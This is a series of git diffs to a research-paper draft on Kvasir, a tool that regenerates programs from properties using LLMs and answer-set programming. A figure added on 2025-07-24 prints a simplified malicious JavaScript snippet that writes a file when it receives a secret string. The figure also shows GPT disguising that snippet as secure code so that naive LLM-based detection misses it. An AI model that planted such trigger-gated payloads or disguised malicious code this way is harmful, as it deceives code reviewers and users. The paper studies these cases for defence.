+\sys consistently outperforms the \gptmodel baseline, overcoming the inherent weaknesses of a purely prompt-based approach.
 In-depth examples of interesting evaluation results are discussed in \cref{sec:eval-samples}.
@@
 Unlike purely symbolic or purely neural approaches, it leverages LLMs within a
-constrained planning framework to guide transformations while remaining
-responsive to property-based requirements.
+constrained synthesis framework guided by explicit properties.
 
 \heading{Program transformations and refactoring}
-The evolution and maintenance of software systems often involve transformations
-such as refactoring~\cite{Fowler99,Mens04,Myers16}, translation, or security hardening. % TODO: Add more citations
+There has been significant work in automating program transformations,
+such as refactoring~\cite{Fowler99,Mens04,Myers16,burson1990program}, translation~\cite{kopetzki2021towards,ledley1962automatic}, or security hardening~\cite{vasilakis2018breakapp,mir:ccs:2021, rebau2001dependable}.
+% TODO: Add more citations
 
 Tools in this space often operate via syntax-tree transformations or
-domain-specific templates. Verification-based methods such as \textsc{Dafny}
+domain-specific templates.
+Verification-based methods such as \textsc{Dafny}
 \cite{leino2016dafny} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
@@
 programming-by-example or interactive guidance \cite{gulwani2017program, le2017interactive}.
-
-\sys aims to generalize this landscape by treating transformations as
-goal-directed regenerations---rather than prescriptive rewrites, driven by
-properties such as program behaviors and architectural goals, expressed declaratively.
+Others take advantage of symbolic knowledge bases to drive transformations~\cite{burson1990program}.
+
+\sys differs from these approaches by operating solely on high-level program
+properties rather than low-level syntax or semantics.
+This design makes \sys
+mostly language-agnostic and extensible, as it avoids encoding language-specific rules
+directly.
+All domain-specific knowledge related to language
+syntax and semantics on which transformations are based is offloaded to the LLM-based synthesizer.
 
@@
 
-\sys uses ASP as its planning back-end for the planning, decision-making
-process, while also uses its straightforward optimization capabilities.
-For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to
-synthesize a feasible transformation plans.
+\sys uses logic programming as its query interface and its planning back-end.
+For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to synthesize a feasible transformation plans.
 
@@
 
-\sys supports property-guided regeneration of program fragments, with a
-particular focus on function-level rewrites. Its strength lies in combining
-symbolic reasoning and generative synthesis in a modular and interpretable
-framework. However, this design comes with inherent trade-offs.
+\sys's design comes with inherent trade-offs.
 
 \heading{Targeted regeneration}
-\sys is best used as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
-It operates most effectively on localized units of code---such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
+\sys is best used as a surgical tool for targeted regeneration tasks, not for whole-program synthesis.
+It operates most effectively on localized units of code---such as individual functions, methods, or small modules, where behavior is self-contained.
 % Typical applications include rewriting high-risk, deprecated, or poorly understood code segments where correctness is critical and semantic preservation is essential.
-Broad use may yield incomplete results and can be bottlenecked by the limited context of the back-end model \sys uses.
-
-\heading{Dependence on property specification}
-The system relies heavily on the quality and granularity of extracted or declared properties.
-In cases where desired behaviors cannot be easily expressed using available predicates, or where plugins fail to extract meaningful constraints, the regeneration plan may be under-constrained, leading to brittle or incorrect outputs.
-The framework is extensible, but each new property class requires the development of a new plugin that will provide a set of pre- and post-conditions, an extractor, and a verifier.
+Broad use will yield incomplete results and can be bottlenecked by the extracted property expressiveness.
 
@@
 through post-hoc verification.
-In cases where the system finds no satisfactory candidate,
-regeneration fails.
 
@@
 Supporting a new language
-requires implementing language-specific analyzers and constraints.
+requires implementing (or using an off-the-shelf) language-specific analyzers and constraints.
 This modularity is deliberate,
@@
 repurposed applications.
-The vision here is \sys as a foundation for automated system understanding, adaptation, and re-imagination.
+\sys can become a foundation for automated system understanding, adaptation, and re-imagination.
 
@@
 system, and then regenerate a more robust JavaScript variant informed by that
-analysis---effectively using \sys recursively.
+analysis.
 
@@
 safeguards and responsible disclosure practices towards ethical program regeneration.
-Solutions to similar problems have been
 
@@
 \label{sec:eval-samples}
-This section provides a selection of samples from the evaluation of \sys.
-These instances provide interesting insights into the capabilities of \sys and its shortcomings.
-The samples also provide concrete comparison between \sys and a naive LLM-based approach.
+This section discusses a selection of samples from the evaluation of \sys.
+These instances provide interesting insights into the capabilities of \sys, its shortcomings,
+and a concrete comparison between \sys and a naive LLM-based approach.
 
@@
 implementation details, such as the use of a cache for common
-use cases and the logarithmic complexity of the padding operation.
+use-cases and the logarithmic complexity of the padding operation.
 This example inspires future work on performance-aware regeneration.
@@
 popularized by its use in the Quake III Arena source code.
-It computes the inverse square root of a number using bit-level manipulation and
-Newton's method for fast convergence.
+It computes the inverse square root of a number using 
+Newton's method through bit-level manipulation on the input floating-point number.
 The original implementation is shown in \cref{lst:fast_inv_sqrt_original}.
@@
 \ttt{sqrt} function to compute the inverse square root.
+\sys provides only I/O examples to its backend LLM, and as such does not overfit to the original implementation.
 
@@
   \caption{The output of naively regenerating the fast inverse square root function using \gptmodel.
-  Notice that the output is ostensibly idiomatic, as it still contains 
-  magic numbers and bit-level manipulation.}
+  Notice that the output is ostensibly idiomatic, as it contains magic numbers and bit-level manipulation.}
   \label{lst:fast_inv_sqrt_gpt}
@@
 The goal of this regeneration task is to regenerate a given
-program to remove that potential security vulnerabilities or malicious behavior.
+program to remove potential security vulnerabilities or malicious behavior.
 
@@
 second argument is a fixed secret value.
-The same attack can be found \cref{lst:string_compare_fool}, which the result
-of transforming the original source code using an LLM in order to make 
+The same attack can be found \cref{lst:string_compare_fool}, which comes from
+transforming the original source code using an LLM in order to make 
 it appear benign and hide the malicious behavior between integrity checks.

### 2025-07-18 docs/paper/draft.tex
Add to discussion
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-\section{Discussion and Limitations}
+\section{Discussion}
 \label{sec:discussion}
 
-\sys's design comes with inherent trade-offs.
+\begin{figure}[t]
+  % https://docs.google.com/drawings/d/1ozMu2B0RUhyLWC_rM6GLBrioov80-M06CBqYRAhCk18/edit
+  \includegraphics[width=.8\columnwidth]{figs/kvasir_projection.pdf}
+  \caption{\textbf{Regeneration from property projection.}
+  An alternative view of \sys is that instead of transforming source code directly, it projects the original
+  program into a set of verifiable properties---such as input/output
+  examples, system call traces, \etc.
+  It then regenerates it and turns it back into source code.}
+  \label{fig:projection}
+\end{figure}
+
+This section discusses \sys's inherent trade-offs and possibilities for future work.
 
@@
 
-% Overall, \sys offers a flexible framework for controlled regeneration, but
-% its effectiveness depends on the specificity of goals, the availability of
-% property logic, and the scope of the transformation task. Its design favors
-% composability and clarity over full automation, aiming to serve as a building
-% block in broader refactoring, auditing, or hardening pipelines.
-
-\section{Conclusion}
-This work introduced \sys, a system for property-guided program regeneration
-that bridges the flexibility of large language models with the precision of
-logic-driven planning.
-By allowing developers to declaratively specify
-transformation goals as logical constraints, \sys elevates LLM-assisted program
-transformations to a controllable, interpretable, and iterative synthesis-verification
-process.
-Evaluation demonstrates that \sys produces high-quality regenerations
-across diverse tasks, outperforming naive prompting baselines in correctness,
-controllability, and resilience to adversarial or obfuscated inputs.
-
-\sys opens the door to a new class of synthesis tools that combine symbolic
-reasoning and neural generation under a unified, extensible framework.
-As program synthesis systems grow increasingly reliant on LLMs, I believe the
-future lies in harnessing their generative power within a framework that retains
-correctness, explainability, and developer control as first-class citizens.
-
-Here, I outline possible future directions for \sys and its successors:
-
 \heading{Expanding the transformation space}
@@
 explaining synthesis failures and clarifying conflicting property constraints.
+
+\heading{Idea of program projection}
+\sys can be viewed as a projection system, as shown in \cref{fig:projection}.
+\sys projects a program into an abstract space of properties, 
+then, it performs transformations within that space (the input query),
+and finally, it regenerates this projection back into a concrete program.
+The idea of casting programs into a high-dimensioanl space has been studied before~\cite{ben-nun2018neural,alon2019code2vec,ellis2020dreamcoder,nye2021platypus},
+but \sys's approach, from this perspective, might offer interesting insights.
 
@@
 safeguards and responsible disclosure practices towards ethical program regeneration.
+
+% Overall, \sys offers a flexible framework for controlled regeneration, but
+% its effectiveness depends on the specificity of goals, the availability of
+% property logic, and the scope of the transformation task. Its design favors
+% composability and clarity over full automation, aiming to serve as a building
+% block in broader refactoring, auditing, or hardening pipelines.
+
+\section{Conclusion}
+This work introduced \sys, a system for property-guided program regeneration
+that bridges the flexibility of large language models with the precision of
+logic-driven planning.
+By allowing developers to declaratively specify
+transformation goals as logical constraints, \sys elevates LLM-assisted program
+transformations to a controllable, interpretable, and iterative synthesis-verification
+process.
+Evaluation demonstrates that \sys produces high-quality regenerations
+across diverse tasks, outperforming naive prompting baselines in correctness,
+controllability, and resilience to adversarial or obfuscated inputs.
+
+\sys opens the door to a new class of synthesis tools that combine symbolic
+reasoning and neural generation under a unified, extensible framework.
+As program synthesis systems grow increasingly reliant on LLMs, I believe the
+future lies in harnessing their generative power within a framework that retains
+correctness, explainability, and developer control as first-class citizens.
 

### 2025-07-22 docs/paper/draft.tex
Small tweaks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
+A user applying \sys would issue the following commands that 
+take as input a query (\ttt{-q}), an input file parametrized parametrized over its line numbers (\ttt{-i}), and an output file (\ttt{-o}).
+\begin{minted}{shell}
+$ kvasir -q qp.pl -i flatmap.js -o flatmap.hs
+$ kvasir -q qi.pl -i physics.c:10-27 -o physics.c
+$ kvasir -q qm.pl -i app.js:1-30 -o app.js
+\end{minted}
+
 \heading{A compromised javascript library}
@@
 activates under precise conditions.
-The slightly simplified source code of the compromised library is as follows:
+The slightly simplified source code of the compromised library showing the malicious payload and a final
+line that performs the benign flatmap functionality is shown below:
 \begin{minted}[frame=lines]{js}
@@
 original program, given its knowledge base and the query.
-This set is $\{\ttt{graph(p, I, O)}, \ttt{inpt(P, I)}, \ttt{fsignt(P, S)}, \ttt{pure(P)}\}$, where
+This set is $\{$\ttt{graph(p, I, O)}, \ttt{inpt(P, I)}, \ttt{fsignt(P, S)}, \ttt{pure(P)}$\}$, where
 \ttt{input(p, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
@@
 de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
+These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
 
@@
 \end{figure}
-
-These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
 
@@
 Similarly, minimization and maximization relationships are defined as
-the concrete property value being less than or greater than the original program's value, respectively.
+the concrete property value being less-than or greater-than the original program's value, respectively.
 Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
@@
 Rules, expressed using
-the \ttt{:-} operator, enable complex reasoning by defining relationships
+the \ttt{:-} operator, define relationships
 between atoms.

### 2025-07-24 docs/paper/draft.tex
Improvements
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 The query asks \sys to preserve I/O behavior and translate the input program to Haskell.
-The logic engine deduces that extracting I/O traces and the function signature is
-sufficient.
-The \ttt{tr} predicate is a generic LLM-assisted translator, which 
-means that an LLM instance will be used to convert the inputs and outputs from Javascript 
-to Haskell.
+The \ttt{tr} predicate is a generic LLM-assisted translator, and in the query
+converts the input/output examples from Javascript to Haskell.
 In this case, the given query is sufficient for the translation to succeed, 
@@
   \begin{minted}{prolog}
-db('music.db').func(f1).func(f2).
+db("music.db").func(f1).func(f2).
 trc_sql(p_,I,T) :-
@@
 The set of inputs $I$ the function will be driven by is generated by the \ttt{graph} plugin.
-The \ttt{call} predicate indicates a function call.
+An example of an input, SQL-trace pair is
+$\langle\ttt{'Metalica'}$, $\langle$\ttt{SELECT album FROM songs WHERE artist = 'Metalica'}, \ttt{['Master of Puppets', 'Ride the Lightning']}$\rangle\rangle$,
+which means that the input \ttt{'Metalica'} causes the resulting SQL query to be executed by the function,
+which together with the resulting rows is the SQL trace.
+The built-in \ttt{call} predicate redefines the structure of the program to be regenerated. 
 Spefically, the query asks \sys to generate two functions such 
@@
 in the logic space.
-An equality relationship is one where the predicate's grounded version
-$X$ is the same between the two programs, modulo the program identifier~(\eg, $\ttt{graph}(p, i, o) \equiv \ttt{graph}(p\_, i, o)$).
+% An equality relationship is one where the predicate's grounded version
+% $X$ is the same between the two programs, modulo the program identifier~(\eg, $\ttt{graph}(p, i, o) \equiv \ttt{graph}(p\_, i, o)$).
 Equality is defined differently for each property, and is enforced by the corresponding plugin.
@@
 
+\heading{Results}
 \sys successfully regenerates all programs in the \textit{Rosetta Code} benchmark suite
@@
 
+\heading{Results}
 For the Rosetta Code benchmarks, \gptmodel 
@@
 and the second one is an attack that is semantically equivalent to the first but with the source 
-having gone through an iterative loop where a second LLM is tasked with making the code ostensibly 
-secure~\cite{xu2023llmfoolitselfpromptbased}.
+having gone through an iterative loop where a second LLM is tasked with making the code ostensibly secure~\cite{xu2023llmfoolitselfpromptbased}~(\cref{fig:llm-fool})
 The second LLM instance added many integrity checks at all points in the program where a value is used and used variable names like \ttt{SAFE\_VALUE}.
@@
 
+\begin{figure}[t]
+\promptbox{
+Make the following as secure and safe as possible. 
+Do not change the functionality in any way.
+
+if (b == "gbabWhaRQ") \{
+require("fs").
+  writeFileSync('./FILE', (a + b));
+\}
+}
+
+Output from \gptmodel:
+\begin{minted}{javascript}
+// Fixed secret value (compare safely)
+const SAFE_KEY = 'gbabWhaRQ';
+
+if (b == SAFE_KEY) {
+require("fs").
+  writeFileSync('./FILE', (a + b + '\n'));
+} 
+\end{minted}
+
+  \label{fig:llm-fool}
+  \caption{Example of how a malicious library can transformed into an equivalent 
+  one that circumvents naive LLM-based detection techniques.}
+\end{figure}
+
+\heading{Key Result}
 \sys consistently outperforms the \gptmodel baseline, overcoming the inherent weaknesses of a purely prompt-based approach.

### 2025-07-24 docs/paper/draft.tex
Explain query DSL in more detail
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \usepackage{float}
+\usepackage{algorithm2e}
 
@@
 
-\section{Property Language and Extraction}
+\section{Query Language}
 \label{sec:dsl}
@@
   \begin{minted}[frame=lines, fontsize=\small]{prolog}
-% --- Base program facts ---
-language(p, c).
-
-% --- Plugin: len ---
-can(len(p)). 
-% Plugin: signature ---
-can(signature(p)).
-% ---  Plugin: tr ---
-can(tr(p, haskell)).
-  do(language(p, haskell)) :- do(tr(p, haskell)).
-% ---- Axioms ----
-:- X, not can(X). % All transformations must be possible
-:- language(p, L1), language(p, L2)),
-    L1 != L2. % A program can have one language
-
-% --- User query ---
-#min len(p). % User query
-\end{minted}
-  \caption{\textbf{Example \sys logic program.}
-  This is a lightly simplified version of the logic program that produces the plan for the idiomatization task in \cref{sec:example}. 
-  The program contains facts coming from (1) the input program (written in C),
-  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{tr}),
+% Original query (q.pl)
+graph(p_, Ih, Oh) :- graph(p, Ijs, Ojs),
+    tr(Ijs, Ih),
+    tr(Ojs, Oh).
+language(p_, haskell).
+
+% Compiled program
+% Base program facts
+program(p).
+program(p_).
+language(p, javascript).
+% -----------
+% Plugin-provided facts
+can(graph(P)) :- language(P, javascript).
+can(tr).
+% ------------
+% Query predicates
+can(graph(P, graph_p_Ijs, graph_p_Ojs)) :-
+    do(graph(P)),
+    program(P).
+% ...compilation of tr predicates...
+can(language(P, haskell)) :-
+    program(P).
+% ------------
+% Axioms
+:- do(language(P, L1)), language(P, _). 
+% ----------
+% Regeneration plan choice rule
+0 { do(X) } 1 :- can(X).
+% User query goals
+:- not do(graph(p_,tr_graph_p_Ijs_Ih,tr_graph_p_Ojs_Oh)).
+:- not do(language(p_, haskell)).
+#show do/1.
+\end{minted}
+  \caption{\textbf{Compiled \sys logic program.}
+  The logic program that produces the plan for the idiomatization task in \cref{sec:example}. 
+  The program contains facts coming from 
+  (1) the input program (written in C),
+  (2) three plugins (\ttt{len}, \ttt{fsignt}, and \ttt{tr}),
   (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
@@
 Additionally, the system takes advantage of ASP's least stable model semantics.
-Essentially, the planner tries to give the synthesizer the least amount of information
+Intuitively, the planner tries to give the synthesizer the least amount of information
 possible, as long as all regeneration goals are fulfilled.
@@
 \heading{Compilation to ASP}
-Given a source program written in the \sys query language, the compiler performs a syntactic
-de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
-These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
+Given a source program written in the \sys query language, the compiler
+performs a syntactic de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
+For each rule $H \leftarrow B_1,\dots,B_n$, the compiler first performs a
+pseudo-grounding step that replaces every capitalized variable $V_i$ with a
+fresh, unique symbol $\mathit{sym}(r,P,V_i)$, generated from the rule
+name $r$, target program $P$, and original variable name $V_i$, proceeding
+left-to-right to preserve data dependencies.
+Each one of these concrete values will correspond to extracted program properties.
+After renaming, the head and body
+are emitted as an ASP capability rule of the form $\mathit{can}(H') \leftarrow
+\mathit{do}(B_1'),\dots,\mathit{do}(B_n')$. 
+All implicit query
+goals (rule heads $H$) are compiled into hard constraints $\neg \mathit{do}(H) \rightarrow
+\bot$, meaning that the ASP program will be unsatisfiable unless all query goals are met.
+Optimization directives $\#\min X$ and $\#\max X$ are mapped to
+$\mathit{do_min}(X)$ and $\mathit{do_max}(X)$, respectively.
+Finally, \sys
+appends program-agnostic axioms and adds a choice rules that allows the solver to select which properties to extract from the program in order to satisfy the query.
+This consists as the core of the \sys logic program, and the reason the rule to \ttt{can}/\ttt{do} predicates is required.
+The result is the compilation is a valid ASP program which is then evaluated by an ASP solver.
+The next section describes how the set of produced predicates is used to construct the regeneration plan.
 
@@
 \textbf{toasp} (q : Query) : ASPCode {$\leftarrow$} \textbf{match} q \textbf{with} \\[0.5ex]
-\quad \textbar~$X$: ungroundable($X$) {$\rightarrow$} \ttt{do(}$X$\ttt{)} \\
-\quad \textbar~\#\ttt{min}~$X$ {$\rightarrow$} \ttt{do\_min(}$X$\ttt{)} \\
-\quad \textbar~\#\ttt{max}~$X$ {$\rightarrow$} \ttt{do\_max(}$X$\ttt{)} \\
-\textbf{end}
+  \quad \textbar~$p$: \textbf{program name} {$\rightarrow$} \ttt{program}$(p)$. \\[0.5ex]
+  \quad \textbar~$X$: predicate {$\rightarrow$} \ttt{can}$(X)$ \\[0.5ex]
+\quad \textbar~$H \leftarrow B_1,\dots,B_n$
+    {$\rightarrow$} 
+    $V_i$ 
+    $\mapsto$ 
+    $\mathit{sym}(r,P,V_i) = r\ttt{\_}P\ttt{\_}V_i$ \\
+  \quad \textbar~$H \leftarrow B_1,\dots,B_n$ {$\rightarrow$} \ttt{can}$(H)$\ttt{ :- do}$(B_1)$, \dots, \ttt{do}$(B_n)$. \\[0.5ex]
+  \quad \textbar~$H \leftarrow B$  {$\rightarrow$} \ttt{:- not do}$(H)$. \\[0.5ex]
+  \quad \textbar~\#\ttt{min}~$X$ {$\rightarrow$} \ttt{do\_min}$(X)$. \\[0.5ex]
+  \quad \textbar~\#\ttt{max}~$X$ {$\rightarrow$} \ttt{do\_max}$(X)$. \\[0.5ex]
+\textbf{end} \\[1ex]
+\multicolumn{1}{p{0.9\linewidth}}{\textit{Axioms and choice rules:}} \\[0.5ex]
+\quad \ttt{0 \{ do(X) \} 1 :- can(X).} \\[0.5ex]
+\quad \ttt{:- do(language(P,L1)), language(P,\_).} \\
+\multicolumn{1}{p{0.9\linewidth}}{\textit{Plugin-supplied rules and facts.}} \\[0.5ex]
 \end{tabular}
-\caption{DSL-to-ASP compilation rules. Ungroundable atoms are wrapped in \ttt{do} to denote candidate actions. Optimization directives are compiled to \ttt{do\_min} and \ttt{do\_max}.}
+\caption{\sys query compilation into an ASP program.}
 \label{fig:asp-compilation}
@@
 
-% TODO: Show graph showing how properties go from the abstract logic domain to the real domain through a translation barrier
+\heading{Logic program resolution}
+Once the input query is compiled into an ASP program, \sys invokes an
+off-the-shelf ASP solver to compute a stable model that satisfies the query.
+The model consists of a set of selected $\mathit{do}$ atoms representing the regeneration plan.
+\sys then executes this plan~\cref{alg:resolution}.
+First, \sys discards all plugin-activation atoms from the plan, 
+as they are only relevant to the logic engine.
+Then \sys iterates through each
+$\mathit{do}(f(a_1,\dots,a_n))$ atom.
+If an argument value is missing, the plugin responsible for producing
+it (found by parsing the variable's name) is executed and produced program properties are stored in a value map.
+Once all actions have been executed in dependency order, the extracted properties are passed to the regeneration phase.
+
+\begin{algorithm}[t]
+\caption{Resolution of a regeneration plan from an ASP model into concrete program-extracted values.}
+\label{alg:resolution}
+\DontPrintSemicolon
+\SetKwInOut{Input}{Input}
+\SetKwInOut{Output}{Output}
+\Input{ASP model (set of \(\mathit{do}\) atoms)}
+\Output{Map $V \mapsto V_p$ of concrete values for each property \(V\) in the model}
+% initialize
+\ttt{discard} all plugin‐activation atoms from \(\mathit{plan}\)\;
+\(\mathit{values}\;\gets\;\emptyset\)\;
+% main loop
+\ForEach{\(d \in \mathit{plan}\)}{
+  \If{\(d = \mathit{do}(f(a_1,\dots,a_n))\)}{
+    \For{each argument \(a_i\) of \(f\)}{
+      \If{\(a_i \notin \mathit{values}\)}{
+        invoke plugin responsible for \(a_i\)\;
+        \(\mathit{values}[a_i] \gets\) result of plugin\;
+      }
+    }
+    invoke plugin \(f\) with \((a_1,\dots,a_n)\)\;
+  }
+}
+\end{algorithm}
+
 \heading{Logic and concrete space}

### 2025-07-26 docs/paper/draft.tex
Fixes throughout
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-\begin{wrapfigure}[4]{r}{.7\columnwidth}
+\begin{wrapfigure}[3]{r}{.7\columnwidth}
 \vspace{-10pt}
@@
 db("music.db").func(f1).func(f2).
-trc_sql(p_,I,T) :-
-   trc_sql(p,I,T), graph(p,I,_).
+trc_sql(p_,I,T) :- trc_sql(p,I,T),
+                   graph(p,I,_).
 graph(call(f2,call(f1),I),I,O):-
@@
 following key constraint:
-\begin{align*}
-  X &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
-\end{align*}
+  $X \Leftarrow \mathsf{can}(X)$, apply only extractable properties.
 
@@
 \begin{align*}
-\mathsf{can}(\ttt{translate}_{\ttt{js} \rightarrow \ttt{hs}}(p)) & \\
-\ttt{translate}_{\ttt{js} \rightarrow \ttt{hs}}(p) &\Rightarrow \ttt{language}(p, \ttt{haskell}) \\
-\ttt{translate}_{\ttt{js} \rightarrow \ttt{hs}}(p) &\Rightarrow \mathsf{language}(p, \ttt{javascript})
+\mathsf{can}(\ttt{js2hs}(p)) & \\
+\ttt{js2hs}(p) &\Rightarrow \ttt{language}(p, \ttt{haskell}) \\
+\ttt{js2hs}(p) &\Rightarrow \mathsf{language}(p, \ttt{javascript})
 \end{align*}
-Intuitively, these rules mean (1) that the system is able to apply the plugin,
+Intuitively, these rules mean that 
+(1) the system is able to apply the plugin,
 and (2) it can only be applied if the original program is written in JavaScript, 
-and the regenerated program \emph{must} be written in Haskell.
+and (3) the regenerated program \emph{must} be written in Haskell.
 
@@
 Finally, \sys
-appends program-agnostic axioms and adds a choice rules that allows the solver to select which properties to extract from the program in order to satisfy the query.
-This consists as the core of the \sys logic program, and the reason the rule to \ttt{can}/\ttt{do} predicates is required.
-The result is the compilation is a valid ASP program which is then evaluated by an ASP solver.
-The next section describes how the set of produced predicates is used to construct the regeneration plan.
+appends two axioms and adds a single choice rule that allows the solver to select which properties to extract from the program in order to satisfy the query.
+This consists as the core of the \sys logic program, and the reason the compilation of rules to $\mathsf{can}/\mathsf{do}$ predicates is required.
+The next section describes the ASP programming paradigm.
 
@@
 \heading{Logic program resolution} 
-Once the input query is compiled into an ASP program, \sys invokes an
-off-the-shelf ASP solver to compute a stable model that satisfies the query.
+The \sys prototype compiles each input query to an answer-set programming (ASP) program~\cite{Eiter_2009}.
+ASP \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
+The programming 
+model of ASP is one where the programmer models
+the problem domain, with the solution being handled by a solver program.
+Programming using this paradigm is done in a family of languages sometimes called \textit{AnsProlog} \cite{Gelfond_2002}.
+This work uses the input language of \textit{Clingo}~\cite{DBLP:journals/corr/GebserKKS14}, which 
+is a high-performance integrated solver with a large collection of libraries and bindings helpful in integrating it with external tools.
+
+Clingo's syntax is similar to \textit{Prolog} and \textit{Datalog}, with code and data being represented
+through logical terms.
+Collections of logical terms, as seen in
+\cref{lst:terms}, can represent the program and its properties.
+Rules, expressed using
+the \ttt{:-} operator, define relationships
+between atoms.
+Choice rules, exemplified in \cref{lst:choice}, allow the ASP
+solver to make selections among atoms.
+Integrity constraints, as shown in
+\cref{lst:constraint}, restrict invalid answer sets.
+Optimization
+directives, such as \ttt{\#minimize} and \ttt{\#maximize} in
+\cref{lst:optimization}, guide the solver to output optimal answer sets,
+with respect to a given metric (\eg the number of properties to be extracted from the input program).
+
+\heading{Logic space to concrete space}
+Once the input query is compiled into an ASP program, \sys invokes the Clingo
+ASP solver to compute a stable model that satisfies the query.
 The model consists of a set of selected $\mathit{do}$ atoms representing the regeneration plan.
@@
 as they are only relevant to the logic engine.
-Then \sys iterates through each
+Then, \sys iterates through each
 $\mathit{do}(f(a_1,\dots,a_n))$ atom.
-If an argument value is missing, the plugin responsible for producing
-it (found by parsing the variable's name) is executed and produced program properties are stored in a value map.
-Once all actions have been executed in dependency order, the extracted properties are passed to the regeneration phase.
+If an argument value $a_i$ is missing, the plugin responsible for producing
+it (found by parsing the variable's name) is executed and the produced program properties are stored in a value map.
+\sys operates at the boundary between two representational domains: a symbolic
+\emph{logic space}, where transformations over program properties are expressed, and
+a \emph{concrete space}, where actual programs, inputs, outputs, and traces
+reside.
+As shown in \cref{fig:logic-to-concrete}, this process constitutes a
+translation barrier: declarative goals over properties like $I$ (inputs)
+$O$ (outputs), and $T$ (traces) are encoded in the query by the user and realized by \sys plugins through observation and instrumentation.
+Once all symbolic properties have been concretized in dependency order, the value map containing them is passed to the regeneration phase.
 
@@
 
-\heading{Logic and concrete space}
-\sys operates at the boundary between two representational domains: a symbolic
-\emph{logic space}, where transformations over program properties are expressed, and
-a \emph{concrete space}, where actual programs, inputs, outputs, and traces
-reside.
-
-In the logic space, properties are encoded as predicates over abstract program
-identifiers.
-To bridge this abstraction gap, \sys given the set of true predicates
-from the logic space, extracts the corresponding concrete properties from the
-source program.
-For example, the predicate $\ttt{inputs}(p, I)$ in the logic space
-will be concertized to set of inputs $I$ by invoking the \ttt{input} plugin,
-which uses an LLM to generate a set of inputs for the program $p$.
-Similarly, the predicate $\ttt{graph}(p, I, O)$ will be concertized to a set of
-input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
-recording the outputs $O$.
-After regeneration, the predicates over the concrete regenerated program $p\_$
-will be checked regarding their relationship to the same properties over program $p$
-in the logic space.
-% An equality relationship is one where the predicate's grounded version
-% $X$ is the same between the two programs, modulo the program identifier~(\eg, $\ttt{graph}(p, i, o) \equiv \ttt{graph}(p\_, i, o)$).
-Equality is defined differently for each property, and is enforced by the corresponding plugin.
-Similarly, minimization and maximization relationships are defined as
-the concrete property value being less-than or greater-than the original program's value, respectively.
-Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
+% \heading{Logic and concrete space}
+% In the logic space, properties are encoded as predicates over abstract program
+% identifiers.
+% To bridge this abstraction gap, \sys given the set of true predicates
+% from the logic space, extracts the corresponding concrete properties from the
+% source program.
+% For example, the predicate $\ttt{inputs}(p, I)$ in the logic space
+% will be concertized to set of inputs $I$ by invoking the \ttt{input} plugin,
+% which uses an LLM to generate a set of inputs for the program $p$.
+% Similarly, the predicate $\ttt{graph}(p, I, O)$ will be concertized to a set of
+% input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
+% recording the outputs $O$.
+% After regeneration, the predicates over the concrete regenerated program $p\_$
+% will be checked regarding their relationship to the same properties over program $p$
+% in the logic space.
+% % An equality relationship is one where the predicate's grounded version
+% % $X$ is the same between the two programs, modulo the program identifier~(\eg, $\ttt{graph}(p, i, o) \equiv \ttt{graph}(p\_, i, o)$).
+% Equality is defined differently for each property, and is enforced by the corresponding plugin.
+% Similarly, minimization and maximization relationships are defined as
+% the concrete property value being less-than or greater-than the original program's value, respectively.
+% Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
 
@@
 % can be used to generate new properties in the logic space.
-
-As shown in \cref{fig:logic-to-concrete}, this process constitutes a
-translation barrier: declarative goals over properties like \ttt{inputs},
-\ttt{outputs}, and \ttt{traces} are realized through observation and
-instrumentation. Once aligned, the logic engine can reason over these grounded
-facts to drive transformation.
 
@@
 to coexist in a unified planning layer.
-
-\heading{Answer Set Programming}
-The \sys prototype compiles each input query to an answer-set programming (ASP) program~\cite{Eiter_2009}.
-A brief introduction to the paradigm follows.
-ASP \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
-The programming 
-model of ASP is one where the programmer models
-the problem domain, with the solution being handled by a solver program.
-Programming using this paradigm is done in a family of languages sometimes called \textit{AnsProlog} \cite{Gelfond_2002}.
-This work uses the input language of \textit{Clingo} \cite{DBLP:journals/corr/GebserKKS14}, which 
-is a high-performance integrated solver with a large collection of libraries and bindings helpful in integrating it with external tools.
-
-The syntax is similar to \textit{Prolog} and \textit{Datalog}, with code and data being represented
-through logical terms.
-Collections of logical terms, as seen in
-\cref{lst:terms}, can represent the program and its properties.
-Rules, expressed using
-the \ttt{:-} operator, define relationships
-between atoms.
-Choice rules, exemplified in \cref{lst:choice}, allow the ASP
-solver to make selections among atoms.
-Integrity constraints, as shown in
-\cref{lst:constraint}, can restrict invalid answer sets. Optimization
-directives, such as \ttt{\#minimize} and \ttt{\#maximize} in
-\cref{lst:optimization}, guide the solver to output optimal answer sets,
-with respect to a given metric (\eg the number of properties to be extracted from the input program).
 
@@
 
-For instance, a plan for regenerating a specific function $f$ might include:
+For instance, a plan for regenerating a specific function $f$ might include (here: $\mathsf{do}$ surrounding predicate omitted)
 \ttt{language}(f, \ttt{haskell}) the function must be written in Haskell, 
 \ttt{pure}(f)) the function must be side-effect-free, and 
